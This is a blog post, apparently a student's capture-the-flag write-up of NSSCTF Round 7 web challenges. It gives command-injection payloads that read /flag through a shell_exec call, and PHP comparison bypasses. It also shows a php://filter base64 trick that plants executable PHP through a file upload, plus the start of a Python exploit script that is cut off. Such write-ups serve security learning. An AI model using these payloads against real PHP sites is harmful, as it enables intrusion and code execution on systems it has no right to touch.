<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="Sh7err"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://npm.elemecdn.com" crossorigin><link rel="canonical" href="http://example.com/2023/09/11/nssctf-round7/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="nssround7_web"><meta property="og:type" content="article"><meta property="og:title" content="nssctf round7"><meta property="og:url" content="http://example.com/2023/09/11/nssctf-round7/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="nssround7_web"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-ez_RCE-flag.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/filename%E8%A7%A3%E6%9E%90.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/fopen%E6%B5%8B%E8%AF%95.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-0o0-flag.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-shadowflag-flag1.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-shadowflag-pin.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-shadowflag-flag2.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-hint.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-%E8%A7%A3%E7%A0%81.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-structure.png"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-web.PNG"><meta property="og:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-%E6%96%B0%E7%9A%84%E5%8D%9A%E5%AE%A2-flag.PNG"><meta property="article:published_time" content="2023-09-11T13:24:07.000Z"><meta property="article:modified_time" content="2023-09-16T13:54:18.324Z"><meta property="article:author" content="John Doe"><meta property="article:tag" content="ctf"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-ez_RCE-flag.PNG"><link rel="icon" type="image/png" href="/images/deer.svg" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/deer.svg"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/deer.svg"><title>nssctf round7 - Sh7err&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/css/build/styles.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fonts/fonts.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fonts/Satoshi/satoshi.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fonts/Chillax/chillax.css"><script id="hexo-configurations">let Global=window.Global||{};Global.hexo_config={hostname:"example.com",root:"/",language:"en"},Global.theme_config={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[]},code_block:{copy:!0,style:"mac",font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:!0,lazyload:!0,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/background.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,open_graph:!0,google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"static",image:{light:"/images/background.webp",dark:"/images/background.webp"},title:"Sh7err's Blog",subtitle:{text:["Being a hacker master"],hitokoto:{enable:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!1,links:{github:null,instagram:null,zhihu:null,twitter:null,email:null},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null}]},mermaid:{enable:!1,version:"9.3.0"}},version:"2.4.4",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},links:{Home:{path:"/",icon:"fa-regular fa-house"},Archives:{path:"/archives",icon:"fa-regular fa-archive"},Tags:{icon:"fa-solid fa-tags",path:"/tags/"},Categories:{icon:"fa-solid fa-folder",path:"/categories/"}},search:{enable:!1,preload:!0}},page_templates:{friends_column:3,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,links:null},article_date_format:"auto",categories:{enable:!0,limit:5},tags:{enable:!0,limit:5}},footerStart:"2023/9/1 00:00:00"},Global.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},Global.data_config={masonry:!1}</script><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fontawesome/brands.min.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fontawesome/solid.min.css"><link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine@2.4.4/source/fontawesome/regular.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span> <span class="swup-progress-icon"><i class="fa-solid fa-circle-notch fa-spin"></i></span></div><main class="page-container" id="swup"><div class="main-content-container"><div class="main-content-header"><header class="navbar-container"><div class="navbar-content"><div class="left"><a class="logo-title" href="http://example.com/">Sh7err&#39;s Blog</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house"></i> HOME</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive"></i> ARCHIVES</a></li><li class="navbar-item"><a href="/tags/"><i class="fa-solid fa-tags"></i> TAGS</a></li><li class="navbar-item"><a href="/categories/"><i class="fa-solid fa-folder"></i> CATEGORIES</a></li></ul></div><div class="mobile"><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color"><ul class="drawer-navbar-list flex flex-col justify-start items-center"><li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center"><a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group" href="/"><i class="fa-regular fa-house"></i> HOME</a></li><li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center"><a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group" href="/archives"><i class="fa-regular fa-archive"></i> ARCHIVES</a></li><li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center"><a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group" href="/tags/"><i class="fa-solid fa-tags"></i> TAGS</a></li><li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center"><a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group" href="/categories/"><i class="fa-solid fa-folder"></i> CATEGORIES</a></li></ul></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><h1 class="article-title-regular">nssctf round7</h1></div><div class="article-header"><div class="avatar"><img src="/images/deer.svg"></div><div class="info"><div class="author"><span class="name">Sh7err</span> <span class="author-label">Lv2</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2023-09-11 21:24:07</span> <span class="mobile">2023-09-11 21:24:07</span> <span class="hover-info">Created</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2023-09-16 21:54:18</span> <span class="mobile">2023-09-16 21:54:18</span> <span class="hover-info">Updated</span> </span><span class="article-tags article-meta-item"><i class="fa-regular fa-tags"></i>&nbsp;<ul><li><a href="/tags/ctf/">ctf</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body"><h1 id="nssround7-web"><a href="#nssround7-web" class="headerlink" title="nssround7_web"></a>nssround7_web</h1><span id="more"></span><h2 id="ez-RCE"><a href="#ez-RCE" class="headerlink" title="ez_RCE"></a>ez_RCE</h2><p>有关于linux基础命令的一题，不难但是考基础，要把鸟哥的书赶紧补了。</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt;</span><br><span class="line">&lt;!-- By 探姬 --&gt;</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"> </span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>这题的payload有很多种。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/7-ez_RCE-flag.PNG"><br>当时想的很简单就是插入一个&amp;cat &#x2F;flag来看flag，把&amp;编码成%26就完事了，结果一上传真行了。data都没用到。。。</p><hr><p>除此以外还有很多payload，下面介绍我看到的几种。</p><ol><li><code>action=||&amp;data=&#39;cat /flag&#39;</code>，利用了管道符||，并且用’来闭合源码中的’</li><li><code>action=;cat /flag;&amp;data=ls</code>，说实话不懂什么原理。</li><li><code>action=1&amp;data=&#39;|ls&#39;</code>,和1差不多</li><li><code>action=1&amp;data=&#39;%26cat /flag&#39;</code>,和我构造的payload差不多,感觉有点多余</li></ol><h2 id="0o0"><a href="#0o0" class="headerlink" title="0o0"></a>0o0</h2><p>参考：</p><ul><li>[谈一谈php:&#x2F;&#x2F;filter的妙用]<a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>[file_put_content和死亡·杂糅代码之缘]<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-2">https://xz.aliyun.com/t/8163#toc-2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>很恶心的一题，做红温了。但是也学到了很多知识。</li></ul><hr><p>进去显示nothing here.抓了个包看下，回显里面有一个get头，值为S0uRc3。就想着到&#x2F;S0uRc3看看，但是显示404了。<br>后来上网看wp发现能扫，扫一下发现有个.DS_Store文件，直接打开（好像有专门打开这种文件的工具）在一堆乱码中看到了一个Ns_SCtF.php，直接访问&#x2F;Ns_SCtF.php</p><hr><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>虽然前面的判断不难，但是不妨碍我菜，还是记录一下吧。</p><ol><li><code>if ($NSSCTF != $NsSCTF &amp;&amp; sha1($NSSCTF) === sha1($NsSCTF))</code>，经典的sha1绕过，和md5绕过方法大致一样，利用数组绕过方法。<code>NSSCTF[]=1&amp;NsSCTF[]=2</code></li><li><code>if (!is_numeric($NsScTF) &amp;&amp; in_array($NsScTF, array(1)))</code>，is_numeric()用来检测变量是否是数字或者数字字符串。in_array()检测变量是否在数组中，这里strict默认为false，所以不会比较数据类型。<code>NsScTF=1z</code></li><li><code>if (file_get_contents($NsScTf) === &quot;Welcome to Round7!!!&quot;)</code>，这里要用data伪协议来对数据流进行操作，注意base64编码。<code>NsScTf=data://text/plain;base64,V2VsY29tZSB0byBSb3VuZDchISE=</code></li><li><code>if (isset($_GET[&#39;nss_ctfer.vip&#39;]))</code>，这里要求我们get传参nss_ctfer.vip，但是<code>_</code>要改为<code>[</code>，因为表单提交的时候php会自动将<code>[</code>和<code>.</code>变成下划线，有且仅变一次。<code>nss[ctfer.vip=1</code></li><li><code>if ($NSScTf != 114514 &amp;&amp; intval($NSScTf, 0) === 114514)</code>，要求NSScTf不能弱比较等于114514同时转换成int类型后要等于114514，这里普遍用114514e1绕过了，但是我用114514的16进制0x1bf52同样也绕过了。这里涉及到php整型转换和intval()函数的知识，不同版本的php返回值可能会不一样。<code>NSScTf=114514e1</code>或者<code>NSScTf=0x1bf52</code><br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.PNG"></li><li><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>)</span><br></pre></td></tr></table></figure></div>nSScTF要求是数字或者数字字符串。优先级：&amp;&amp;&gt;&#x3D;&gt;and、||&gt;&#x3D;&gt;or。所以nSscTF直接赋值NSSROUND7就可以了。<code>nSScTF=1&amp;nSscTF=NSSRound7</code></li></ol><hr><p>然后就是这题的核心部分了</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>要求POST传一个submit，还得传一个文件，文件名中要有.png，我们上传的文件内容前面会被加上一个<code>&lt;?php die(&quot;Round7 do you like&quot;);</code>，这样无论传什么都会先运行<code>die()</code>，看了开头的文章才知道要通过编码来绕过。我们可以上传一段php代码<code>&lt;?php phpinfo();?&gt;</code>base64编码后的代码，然后再把加上die()之后的整个文件用base64解码，这样原来的<code>&lt;?php die(&quot;Round7 do you like&quot;);</code>就会被解析为乱码，而我们的恶意代码就会被解码成正常代码。<br><strong>需要注意的是</strong>base64解码时以4个字符为一个单位，那么为了不影响恶意代码的正常解码，我们需要在前面填充字符。base64中不存在的字符不会被读取，所以最后前面剩<code>phpdieRound7doyoulike</code>共21个字符，再填充三个字符在末尾就ok了，所以我们在恶意代码前面加三个字符就行了。</p><hr><p>到这里出现另一个问题就是我们怎么让服务器base64解码我们上传的文件，答案就是我们可以用php:&#x2F;&#x2F;filter伪协议来构造filename。fopen会把文件指定的资源名绑定到一个流上，<code>filename</code>参数可以指定php协议，那么我们可以构造<code>php://filter/convert.base64-decode/resource=1.png.php&#39;</code>来当作<code>filename</code>，注意<code>$file_name = urldecode($_FILES[&#39;file&#39;][&#39;name&#39;]);</code>，所以我们要把构造的filename进行一次URL编码，最后是<code>%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%2e%70%6e%67%2e%70%68%70</code></p><p><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/filename%E8%A7%A3%E6%9E%90.PNG"><br>测试了一下fopen()函数，顺便说一下<code>file_put_contents()</code>也会默认打开fopen(),它就相当于fopen()、fwrite()和fclose()的集合。</p><p><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/fopen%E6%B5%8B%E8%AF%95.PNG"></p><p>脚本如下</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> base64 import b64encode</span><br><span class="line">import re</span><br><span class="line">def <span class="title function_ invoke__">getflag</span>(URL):</span><br><span class="line">    url=f<span class="string">&quot;&#123;URL&#125;/Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1%00&amp;NsScTf=data://text/plain;base64,V2VsY29tZSB0byBSb3VuZDchISE=&amp;nss[ctfer.vip=1&amp;NSScTf=0x1bf52&amp;nSScTF=1&amp;nSscTF=NSSRound7&quot;</span></span><br><span class="line">    data=&#123;<span class="string">&quot;submit&quot;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span 